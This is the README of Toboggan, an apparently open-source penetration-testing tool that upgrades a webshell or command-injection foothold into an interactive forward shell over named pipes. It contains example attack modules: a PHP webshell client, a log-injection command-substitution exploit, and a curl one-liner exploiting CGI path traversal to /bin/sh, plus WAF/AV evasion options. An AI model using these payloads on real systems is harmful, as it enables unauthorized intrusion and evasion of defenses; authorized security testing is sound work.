# 🛝 Toboggan

Toboggan bridges the gap between having Remote Code Execution (RCE) [PoC](https://github.com/n3rada/toboggan#-rce-module-interface) and having a usable semi-interactive shell on Linux and Windows targets when a reverse shell is not even an option (e.g., firewall, NAT, outbound filtering).

<p align="center">
    
</p>

Point `toboggan` at any Python script that exposes an `execute(command, timeout)` function. It will wrap any command execution primitive into an interactive session with history and modular post-exploitation actions.

The built-in forward shell in Linux uses named pipes (`mkfifo`) to provide stdin/stdout communication through the same channel.

```mermaid
%% Generated by https://gitdiagram.com/n3rada/toboggan
flowchart TD

subgraph group_session["Session runtime"]
  node_cli["CLI<br/>[cli.py]"]
  node_banner["Banner<br/>[banner.py]"]
  node_executor["Command executor<br/>[executor.py]"]
  node_terminal["Interactive terminal<br/>[terminal.py]"]
end

subgraph group_backends["Execution backends"]
  node_rce_module["User RCE module"]
  node_burp["Burp request backend<br/>[burpsuite.py]"]
  node_wrapper["Command wrapper backend<br/>[os_command.py]"]
end

subgraph group_actions["Target actions"]
  node_action_manager["Action manager<br/>[action.py]"]
  node_fifo["Named-pipe shell<br/>[linux.py]"]
  node_file_transfer["File transfer"]
  node_binary_drop["Binary deployment<br/>[linux.py]"]
  node_command_transform["Command obfuscation"]
  node_post_exploitation["Post-exploitation actions"]
  node_kube_check["Kubernetes checks<br/>[linux.py]"]
end

subgraph group_support["Target support"]
  node_os_helpers["OS helpers"]
  node_target["Target context<br/>[target.py]"]
  node_utilities["Runtime utilities"]
  node_history["Session history<br/>[logbook.py]"]
end

node_operator(("Operator"))
node_remote_target(("Remote system"))

node_operator -->|"starts session"| node_cli
node_cli -->|"displays"| node_banner
node_cli -->|"configures"| node_executor
node_cli -.->|"loads request"| node_burp
node_cli -.->|"selects backend"| node_wrapper
node_cli -->|"loads module"| node_rce_module
node_executor -->|"executes commands"| node_rce_module
node_executor -->|"drives session"| node_terminal
node_terminal -->|"loads actions"| node_action_manager
node_terminal -->|"records history"| node_history
node_executor -->|"uses helpers"| node_os_helpers
node_executor -->|"creates context"| node_target
node_executor -->|"transforms commands"| node_command_transform
node_executor -->|"sends commands"| node_remote_target
node_action_manager -.->|"loads action"| node_fifo
node_os_helpers -->|"starts named pipe"| node_fifo
node_fifo -->|"creates pipes"| node_remote_target
node_action_manager -.->|"loads actions"| node_file_transfer
node_binary_drop -->|"uploads binary"| node_file_transfer
node_action_manager -.->|"loads actions"| node_post_exploitation
node_action_manager -.->|"loads action"| node_kube_check
node_kube_check -->|"queries cluster"| node_remote_target
node_file_transfer -->|"transfers files"| node_remote_target
node_executor -->|"uses utilities"| node_utilities

click node_cli "https://github.com/n3rada/toboggan/blob/main/src/toboggan/cli.py"
click node_banner "https://github.com/n3rada/toboggan/blob/main/src/toboggan/banner.py"
click node_executor "https://github.com/n3rada/toboggan/blob/main/src/toboggan/core/executor.py"
click node_terminal "https://github.com/n3rada/toboggan/blob/main/src/toboggan/core/terminal.py"
click node_burp "https://github.com/n3rada/toboggan/blob/main/src/toboggan/core/handlers/burpsuite.py"
click node_wrapper "https://github.com/n3rada/toboggan/blob/main/src/toboggan/core/handlers/os_command.py"
click node_action_manager "https://github.com/n3rada/toboggan/blob/main/src/toboggan/core/action.py"
click node_fifo "https://github.com/n3rada/toboggan/blob/main/src/toboggan/core/actions/fifo/linux.py"
click node_file_transfer "https://github.com/n3rada/toboggan/tree/main/src/toboggan/core/actions/upload"
click node_binary_drop "https://github.com/n3rada/toboggan/blob/main/src/toboggan/core/actions/drop_bin/linux.py"
click node_command_transform "https://github.com/n3rada/toboggan/tree/main/src/toboggan/core/actions/obfuscate"
click node_post_exploitation "https://github.com/n3rada/toboggan/tree/main/src/toboggan/core/actions"
click node_kube_check "https://github.com/n3rada/toboggan/blob/main/src/toboggan/core/actions/kube_check/linux.py"
click node_os_helpers "https://github.com/n3rada/toboggan/tree/main/src/toboggan/core/helpers"
click node_target "https://github.com/n3rada/toboggan/blob/main/src/toboggan/core/target.py"
click node_utilities "https://github.com/n3rada/toboggan/tree/main/src/toboggan/core/utils"
click node_history "https://github.com/n3rada/toboggan/blob/main/src/toboggan/core/utils/logbook.py"

classDef toneNeutral fill:#f8fafc,stroke:#334155,stroke-width:1.5px,color:#0f172a
classDef toneBlue fill:#dbeafe,stroke:#2563eb,stroke-width:1.5px,color:#172554
classDef toneAmber fill:#fef3c7,stroke:#d97706,stroke-width:1.5px,color:#78350f
classDef toneMint fill:#dcfce7,stroke:#16a34a,stroke-width:1.5px,color:#14532d
classDef toneRose fill:#ffe4e6,stroke:#e11d48,stroke-width:1.5px,color:#881337
classDef toneIndigo fill:#e0e7ff,stroke:#4f46e5,stroke-width:1.5px,color:#312e81
classDef toneTeal fill:#ccfbf1,stroke:#0f766e,stroke-width:1.5px,color:#134e4a
class node_cli,node_banner,node_executor,node_terminal toneBlue
class node_rce_module,node_burp,node_wrapper toneAmber
class node_action_manager,node_fifo,node_file_transfer,node_binary_drop,node_command_transform,node_post_exploitation,node_kube_check toneMint
class node_os_helpers,node_target,node_utilities,node_history toneRose
class node_operator,node_remote_target toneIndigo
```

<details>
<summary><strong>🧭 How It Works</strong></summary>

<br>



This architecture diagram was generated with [GitDiagram](https://gitdiagram.com/n3rada/toboggan).

</details>

## 📦 Installation

Prefer using [`uv`](https://docs.astral.sh/uv/), a fast Python package manager that installs tools in isolated environments. Alternatively, [`pipx`](https://pypa.github.io/pipx/) or `pip` work as well.

### With [uv](https://docs.astral.sh/uv/) (recommended)

[`uv tool install`](https://docs.astral.sh/uv/guides/tools/#installing-tools) persistently installs the tool and adds it to your `PATH`, similar to `pipx`:

```bash
uv tool install git+https://github.com/n3rada/toboggan.git
```

After installation, `toboggan` is available directly:

```bash
toboggan --help
```

To upgrade later:

```bash
uv tool upgrade toboggan
```

> [!TIP]
> You can also run `toboggan` **without installing** it using [`uvx`](https://docs.astral.sh/uv/guides/tools/#running-tools) (alias for `uv tool run`), which creates a temporary isolated environment on the fly:
> ```bash
> uvx --from git+https://github.com/n3rada/toboggan.git toboggan --help
> ```

To inject an extra dependency (e.g., a database driver needed by your RCE module):

```bash
uv tool install git+https://github.com/n3rada/toboggan.git --with pyrfc==3.3.1
```

### With [`pipx`](https://pypa.github.io/pipx/)

> [!NOTE]
> `pipx` installs Python applications in isolated virtual environments, which means they do not have access to system-wide packages by default (like `psycopg2`).

```bash
pipx install 'git+https://github.com/n3rada/toboggan.git'
```

To use system site packages, pass `--system-site-packages`:
```bash
pipx install --system-site-packages 'git+https://github.com/n3rada/toboggan.git'
```

Or inject a dependency directly:
```bash
pipx inject toboggan pyrfc==3.3.1
```

### With pip

```bash
pip install 'git+https://github.com/n3rada/toboggan.git'
```

## 🔍 RCE Module Interface

This is the primary way to use Toboggan. A module is a plain Python script that encapsulates how a command reaches the target: the HTTP request, the authentication flow, the protocol quirks, and the output extraction. Toboggan calls your `execute()` function for every command and drives the entire session from what it returns.

Your module must expose exactly this function:

```python
def execute(command: str, timeout: float) -> str:
    ...
```

Toboggan passes every shell command through it and expects back the clean text output, as if the command ran locally. Nothing else is required: no class, no config file, no registration.

### Examples

#### PHP Webshell

```python
import httpx

URL = "http://target.com/uploads/shell.php"

def execute(command: str, timeout: float) -> str:
    r = httpx.post(URL, data={"cmd": command}, timeout=timeout, verify=False)
    return r.text.strip()
```

#### Multi-step: log-injection RCE

Some targets have no direct output channel. The function can chain as many requests as needed: trigger a functionality, inject into a side channel, and read back the result. It is plain Python, so anything goes:

```python
import httpx
import re

BASE = "http://target.com"

def execute(command: str, timeout: float) -> str:
    client = httpx.Client(base_url=BASE, verify=False, timeout=timeout)

    # Step 1: trigger the feature that writes a user-controlled value into an app log
    client.post("/api/report", json={"name": f"$(  {command}  )"})

    # Step 2: inject the command output into the log through a second endpoint
    # (the app evaluates the shell substitution before writing)
    client.get("/api/status", params={"debug": "1"})

    # Step 3: fetch the log file and extract the last entry
    r = client.get("/admin/logs/app.log")
    match = re.search(r"\[CMD\] (.+)", r.text)
    return match.group(1).strip() if match else ""
```

This pattern covers multi-stage SSRF chains, or any custom protocol that exposes command execution. As long as `execute()` returns the command output as a string, Toboggan handles the rest.

### 💡 Considerations

Your `execute()` function owns the full translation between Toboggan's command string and the target:

- Replace characters the channel rejects (e.g., spaces → `${IFS}`)
- Apply any encoding the target expects before sending (`base64`, URL encoding, hex)
- Strip noise from the response (banners, prompts, HTML wrappers) before returning
- Tune the timeout to the target's latency; Toboggan adapts internally but your function sets the floor

## 🔌 Built-in Execution Backends

When writing a module is not practical, Toboggan ships two built-in backends that cover common cases directly from the command line.

### 📄 Burp Suite Request

Import a request saved from Burp Suite and place `||cmd||` where the command should be injected (URL, headers, or body):

```shell
toboggan --request burp_request.xml
```

> [!TIP]
> In Burp Suite, right-click a request → **Save item**, then add `||cmd||` where the command should be injected.

### 🧰 Shell Command Wrapper

Wrap any shell command that contains a command injection point using the `||cmd||` placeholder:

```shell
toboggan --exec-wrapper 'curl -s --path-as-is -d "echo Content-Type: text/plain; echo; ||cmd||" "http://192.168.216.188/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"'
```

## 🧸 Usage

```shell
toboggan <module> [options]
toboggan --exec-wrapper '<command_template>'
toboggan --request <burp_file>
```

Upgrade your web shell or command injection to an interactive shell:
```shell
toboggan ~/phpexploit.py
```

### 🌐 Proxy

Forward traffic through any HTTP(S) proxy:

```shell
toboggan ~/phpexploit.py --proxy http://squideu.<something>.io:3128
```

Route through [Burp Suite](https://portswigger.net/burp) (defaults to `http://127.0.0.1:8080`):
```shell
toboggan ~/phpexploit.py --proxy
```

### 🔐 Obfuscation

`--obfuscate` (`-O`) wraps each command in a shell-level transformation (using the `obfuscate`/`deobfuscate` actions) before it reaches the target. This is useful against WAF or AV filters that inspect the command string:

```shell
toboggan ~/phpexploit.py --obfuscate --os "linux"
```

`-b64` (`--base64`) encodes the command at the transport level: whatever string Toboggan would send to `execute()` gets base64-encoded first. The target must decode and eval it. Use this when the execution channel requires it or when the module is built to handle it:

```shell
toboggan ~/phpexploit.py -b64
```

Both flags can be combined. When active together, commands are obfuscated first at the shell level, and the resulting pipeline is then base64-encoded before reaching `execute()`. Toboggan will warn you when both are active so the layering is intentional, not accidental.

Both layers can also be toggled at runtime with `!obfuscate` and `!b64` inside the REPL.

## 🏗️ Forward Shell (Named Pipes)

Toboggan upgrades dumb web shells into semi-interactive shells using named pipes (FIFO) for inter-process communication. This forward shell technique is invaluable when:

- You can't get a reverse shell due to firewall restrictions
- Target is behind NAT or multiple proxies
- Working with HTTP-only RCE channels (web shells, command injection)
- Dealing with blind command execution that doesn't return output immediately
- You need an interactive shell without opening connections back to your machine

```shell
toboggan ~/phpexploit.py --fifo
```

The forward shell uses `mkfifo` under the hood to create a semi-interactive shell experience over named pipes, even in heavily restricted environments. This enables interactive commands that require stdin/stdout communication such as `sudo -l` and any scripts using `read` that expect real-time user input.

Combine with obfuscation for maximum stealth:
```shell
toboggan ~/phpexploit.py --obfuscate --fifo --os "linux"
```

> [!WARNING]
> Ctrl+C is not forwarded. Control characters only work in real TTY/PTY environments.

### ⚙️ Named Pipe Options

| Flag | Description |
|---|---|
| `--fifo` | Start a semi-interactive FIFO session |
| `-ri`, `--read-interval` | Polling interval in seconds (default: `0.3`) |
| `-i`, `--stdin` | Custom input path for the FIFO pipe |
| `-o`, `--stdout` | Custom output path for the FIFO pipe |
| `--shell` | Shell binary for named pipe execution (e.g., `/bin/bash`) |

## 🛠️ Built-in Actions

Actions are modular plugins executed via the `!` prefix inside the terminal session. Use `!help` to list all available actions.

### 🧩 Bring Your Own Actions (BYOA)

Custom actions can be placed in the user action directory. Toboggan loads user actions with priority over built-in ones, allowing you to override or extend functionality.

| Platform | Path |
|---|---|
| Linux/macOS | `$XDG_DATA_HOME/toboggan/actions/` (default: `~/.local/share/toboggan/actions/`) |
| Windows | `%LOCALAPPDATA%\toboggan\actions\` |

Each action is a Python file inside a subdirectory named after the action, with OS-specific implementations:

```
actions/
  my_action/
    linux.py    # Linux implementation
    windows.py  # Windows implementation
```

Your action class must inherit from `BaseAction` and implement the `run()` method. See [DEVELOPMENT.md](DEVELOPMENT.md) for the full guide on creating actions.

## 📂 Data Storage

Toboggan follows [XDG Base Directory](https://specifications.freedesktop.org/basedir-spec/latest/) conventions on Linux:

| Purpose | Linux Path | Windows Path |
|---|---|---|
| **User actions** | `$XDG_DATA_HOME/toboggan/actions/` | `%LOCALAPPDATA%\toboggan\actions\` |
| **Logs** | `$XDG_STATE_HOME/toboggan/logs/` | `%LOCALAPPDATA%\toboggan\logs\` |
| **Command history** | `$XDG_STATE_HOME/toboggan/history/` | `%LOCALAPPDATA%\toboggan\history\` |
| **Cached binaries** | `$XDG_CACHE_HOME/toboggan/binaries/` | `%LOCALAPPDATA%\toboggan\binaries\` |

> [!TIP]
> Override the log directory with the `TOBOGGAN_LOG_DIR` environment variable.

## ❓ Help

```shell
toboggan --help              # Show all CLI options
toboggan ~/exploit.py        # Then type !help for available actions
toboggan ~/exploit.py        # Then type !<action> -h for action-specific help
```

### 🔧 Terminal Built-in Commands

| Command | Description |
|---|---|
| `!help` (`!h`) | Show available actions and built-in commands |
| `!exit` (`!e`, `!ex`) | Exit the terminal session |
| `!size [bytes]` | Probe or set max command size |
| `!debug` | Toggle debug logging |
| `!trace` | Toggle trace logging |
| `!paths` | Show custom paths and command location cache |
| `!paths add <paths>` | Add custom paths for command lookup |
| `!paths clear` | Clear the command location cache |
| `!obfuscate` | Toggle command obfuscation on/off |
| `!b64` | Toggle base64 wrapping of commands before `execute()` |

## ⚠️ Disclaimer

Toboggan is intended for use in legal penetration testing, Capture The Flag (CTF) competitions, or other authorized and ethical security assessments.

Acceptable environments include:
- Private lab environments you control (local VMs, isolated networks)
- Sanctioned learning platforms (CTFs, Hack The Box, OffSec exam scenarios)
- Formal penetration-test or red-team engagements with documented customer consent

Misuse of this project may result in legal action.

## ⚖️ Legal Notice

Any unauthorized use of this tool in real-world environments or against systems without explicit permission from the system owner is strictly prohibited and may violate legal and ethical standards. The creators and contributors of this tool are not responsible for any misuse or damage caused.

Use responsibly and ethically. Always respect the law and obtain proper authorization.
